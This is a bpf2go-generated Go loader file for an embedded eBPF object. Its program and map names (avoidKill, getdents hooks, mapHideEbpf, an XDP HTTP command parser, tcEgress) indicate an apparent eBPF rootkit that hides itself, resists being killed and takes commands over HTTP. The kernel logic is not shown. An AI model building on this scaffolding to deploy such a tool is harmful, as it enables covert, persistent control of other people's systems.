// Code generated by bpf2go; DO NOT EDIT.
//go:build 386 || amd64 || amd64p32 || arm || arm64 || loong64 || mips64le || mips64p32le || mipsle || ppc64le || riscv64

package main

import (
	"bytes"
	_ "embed"
	"fmt"
	"io"

	"github.com/cilium/ebpf"
)

type ebpfEvent struct {
	Type    uint8
	_       [3]byte
	Pid     uint32
	Comm    [16]uint8
	Success bool
	_       [3]byte
}

type ebpfHttpCmd struct {
	Type uint8
	Cmd  [100]uint8
}

// loadEbpf returns the embedded CollectionSpec for ebpf.
func loadEbpf() (*ebpf.CollectionSpec, error) {
	reader := bytes.NewReader(_EbpfBytes)
	spec, err := ebpf.LoadCollectionSpecFromReader(reader)
	if err != nil {
		return nil, fmt.Errorf("can't load ebpf: %w", err)
	}

	return spec, err
}

// loadEbpfObjects loads ebpf and converts it into a struct.
//
// The following types are suitable as obj argument:
//
//	*ebpfObjects
//	*ebpfPrograms
//	*ebpfMaps
//
// See ebpf.CollectionSpec.LoadAndAssign documentation for details.
func loadEbpfObjects(obj interface{}, opts *ebpf.CollectionOptions) error {
	spec, err := loadEbpf()
	if err != nil {
		return err
	}

	return spec.LoadAndAssign(obj, opts)
}

// ebpfSpecs contains maps and programs before they are loaded into the kernel.
//
// It can be passed ebpf.CollectionSpec.Assign.
type ebpfSpecs struct {
	ebpfProgramSpecs
	ebpfMapSpecs
}

// ebpfSpecs contains programs before they are loaded into the kernel.
//
// It can be passed ebpf.CollectionSpec.Assign.
type ebpfProgramSpecs struct {
	AvoidKill           *ebpf.ProgramSpec `ebpf:"avoidKill"`
	HandleBpfEnter      *ebpf.ProgramSpec `ebpf:"handleBpfEnter"`
	HandleBpfExit       *ebpf.ProgramSpec `ebpf:"handleBpfExit"`
	HandleGetdentsEnter *ebpf.ProgramSpec `ebpf:"handleGetdentsEnter"`
	HandleGetdentsExit  *ebpf.ProgramSpec `ebpf:"handleGetdentsExit"`
	HandleKillExit      *ebpf.ProgramSpec `ebpf:"handleKillExit"`
	TcEgress            *ebpf.ProgramSpec `ebpf:"tcEgress"`
	XdpHttpParser       *ebpf.ProgramSpec `ebpf:"xdpHttpParser"`
}

// ebpfMapSpecs contains maps before they are loaded into the kernel.
//
// It can be passed ebpf.CollectionSpec.Assign.
type ebpfMapSpecs struct {
	MapAvoidKillPid *ebpf.MapSpec `ebpf:"mapAvoidKillPid"`
	MapBuffs        *ebpf.MapSpec `ebpf:"mapBuffs"`
	MapBytesRead    *ebpf.MapSpec `ebpf:"mapBytesRead"`
	MapCmdRes       *ebpf.MapSpec `ebpf:"mapCmdRes"`
	MapHideEbpf     *ebpf.MapSpec `ebpf:"mapHideEbpf"`
	MapPidIndex     *ebpf.MapSpec `ebpf:"mapPidIndex"`
	MapProgArray    *ebpf.MapSpec `ebpf:"mapProgArray"`
	MapSeq          *ebpf.MapSpec `ebpf:"mapSeq"`
	MapToPatch      *ebpf.MapSpec `ebpf:"mapToPatch"`
	Rb              *ebpf.MapSpec `ebpf:"rb"`
}

// ebpfObjects contains all objects after they have been loaded into the kernel.
//
// It can be passed to loadEbpfObjects or ebpf.CollectionSpec.LoadAndAssign.
type ebpfObjects struct {
	ebpfPrograms
	ebpfMaps
}

func (o *ebpfObjects) Close() error {
	return _EbpfClose(
		&o.ebpfPrograms,
		&o.ebpfMaps,
	)
}

// ebpfMaps contains all maps after they have been loaded into the kernel.
//
// It can be passed to loadEbpfObjects or ebpf.CollectionSpec.LoadAndAssign.
type ebpfMaps struct {
	MapAvoidKillPid *ebpf.Map `ebpf:"mapAvoidKillPid"`
	MapBuffs        *ebpf.Map `ebpf:"mapBuffs"`
	MapBytesRead    *ebpf.Map `ebpf:"mapBytesRead"`
	MapCmdRes       *ebpf.Map `ebpf:"mapCmdRes"`
	MapHideEbpf     *ebpf.Map `ebpf:"mapHideEbpf"`
	MapPidIndex     *ebpf.Map `ebpf:"mapPidIndex"`
	MapProgArray    *ebpf.Map `ebpf:"mapProgArray"`
	MapSeq          *ebpf.Map `ebpf:"mapSeq"`
	MapToPatch      *ebpf.Map `ebpf:"mapToPatch"`
	Rb              *ebpf.Map `ebpf:"rb"`
}

func (m *ebpfMaps) Close() error {
	return _EbpfClose(
		m.MapAvoidKillPid,
		m.MapBuffs,
		m.MapBytesRead,
		m.MapCmdRes,
		m.MapHideEbpf,
		m.MapPidIndex,
		m.MapProgArray,
		m.MapSeq,
		m.MapToPatch,
		m.Rb,
	)
}

// ebpfPrograms contains all programs after they have been loaded into the kernel.
//
// It can be passed to loadEbpfObjects or ebpf.CollectionSpec.LoadAndAssign.
type ebpfPrograms struct {
	AvoidKill           *ebpf.Program `ebpf:"avoidKill"`
	HandleBpfEnter      *ebpf.Program `ebpf:"handleBpfEnter"`
	HandleBpfExit       *ebpf.Program `ebpf:"handleBpfExit"`
	HandleGetdentsEnter *ebpf.Program `ebpf:"handleGetdentsEnter"`
	HandleGetdentsExit  *ebpf.Program `ebpf:"handleGetdentsExit"`
	HandleKillExit      *ebpf.Program `ebpf:"handleKillExit"`
	TcEgress            *ebpf.Program `ebpf:"tcEgress"`
	XdpHttpParser       *ebpf.Program `ebpf:"xdpHttpParser"`
}

func (p *ebpfPrograms) Close() error {
	return _EbpfClose(
		p.AvoidKill,
		p.HandleBpfEnter,
		p.HandleBpfExit,
		p.HandleGetdentsEnter,
		p.HandleGetdentsExit,
		p.HandleKillExit,
		p.TcEgress,
		p.XdpHttpParser,
	)
}

func _EbpfClose(closers ...io.Closer) error {
	for _, closer := range closers {
		if err := closer.Close(); err != nil {
			return err
		}
	}
	return nil
}

// Do not access this directly.
//
//go:embed ebpf_bpfel.o
var _EbpfBytes []byte
